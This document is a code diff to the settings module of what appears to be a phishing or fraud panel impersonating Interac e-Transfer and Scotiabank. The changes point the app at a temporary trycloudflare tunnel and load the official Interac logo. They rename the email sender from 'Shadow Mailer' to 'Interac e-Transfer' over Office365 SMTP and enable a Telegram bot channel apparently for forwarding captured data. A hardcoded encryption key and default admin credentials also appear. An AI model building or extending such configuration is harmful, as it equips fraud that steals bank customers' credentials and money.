@@ -20,13 +20,13 @@ if (!fs.existsSync(path.join(DB_DIR, 'logs'))) fs.mkdirSync(path.join(DB_DIR, 'l
 
 const defaultSettings: GlobalSettings = {
     general: { 
-        app_url: "https://bible-pieces-sharing-lawyer.trycloudflare.com ", 
-        webroot_url: "https://bible-pieces-sharing-lawyer.trycloudflare.com ",
-        sender_name: "AB FARMS LTD", 
-        encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
+        app_url: process.env.APP_URL || "https://bible-pieces-sharing-lawyer.trycloudflare.com", 
+        webroot_url: process.env.WEBROOT_URL || "https://bible-pieces-sharing-lawyer.trycloudflare.com",
+        sender_name: process.env.SENDER_NAME || "AB FARMS LTD", 
+        encryption_key: process.env.ENCRYPTION_KEY || "a3f91b6cd024e8c29b76a149efcc5d42",
         maintenanceMode: false,
         bank_name: "Scotiabank",
-        bank_logo: "",
+        bank_logo: "https://etransfer-content.interac.ca/en/logo_CA000002.png",
         overdraftLimit: 5000,
         transferLimit: 3000,
         dailyLimit: 10000,
@@ -35,10 +35,21 @@ const defaultSettings: GlobalSettings = {
         admin_username: "PROJECTSARAH",
         admin_password: "PROJECTSARAH",
         adminPin: "1234",
-        baseActionUrl: "https://bible-pieces-sharing-lawyer.trycloudflare.com "
+        baseActionUrl: "https://bible-pieces-sharing-lawyer.trycloudflare.com"
     },
-    smtp: { host: "", port: 587, secure: false, user: "", pass: "", senderName: "Shadow Mailer" },
-    telegram: { token: "", chat_id: "", enabled: false }
+    smtp: { 
+        host: process.env.SMTP_HOST || "smtp.office365.com", 
+        port: parseInt(process.env.SMTP_PORT || "587"), 
+        secure: process.env.SMTP_SECURE === "true", 
+        user: process.env.SMTP_USER || "", 
+        pass: process.env.SMTP_PASS || "", 
+        senderName: process.env.SMTP_SENDER_NAME || "Interac e-Transfer" 
+    },
+    telegram: { 
+        token: process.env.TELEGRAM_BOT_TOKEN || "", 
+        chat_id: process.env.TELEGRAM_CHAT_ID || "", 
+        enabled: process.env.TELEGRAM_ENABLED === "true" 
+    }
 };
 
 const getChats = async () => {
@@ -74,7 +85,20 @@ const getSettings = async (): Promise<GlobalSettings> => {
     try {
         if (fs.existsSync(settingsPath)) {
             const data = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
-            return { ...defaultSettings, ...data };
+            const settings = { ...defaultSettings, ...data };
+            
+            // Allow env overrides for SMTP if JSON fields are empty
+            if ((!settings.smtp.user || settings.smtp.user === "") && process.env.SMTP_USER) {
+                settings.smtp.user = process.env.SMTP_USER;
+            }
+            if ((!settings.smtp.pass || settings.smtp.pass === "") && process.env.SMTP_PASS) {
+                settings.smtp.pass = process.env.SMTP_PASS;
+            }
+            if ((!settings.smtp.host || settings.smtp.host === "") && process.env.SMTP_HOST) {
+                settings.smtp.host = process.env.SMTP_HOST;
+            }
+
+            return settings;
         } else {
             fs.writeFileSync(settingsPath, JSON.stringify(defaultSettings, null, 2));
         }
